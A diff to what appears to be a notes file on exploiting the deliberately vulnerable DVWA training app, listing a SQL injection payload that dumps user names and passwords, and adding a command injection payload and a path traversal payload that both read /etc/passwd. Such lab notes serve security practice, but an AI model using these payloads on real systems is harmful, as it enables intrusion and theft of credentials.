@@ -14,5 +14,9 @@ If you are playing it in low dificulty, just to have a taste of how exploit a fl
 %' and 1=0 union select null, concat(user,':',password) from users #
 
 
-More Details : 
-https://hub.docker.com/r/vulnerables/web-dvwa
+Command Injection Payload : 
+127.0.0.1; cat /etc/passwd 
+
+
+File Inclusion Payload : 
+?page=../../../../../../etc/passwd
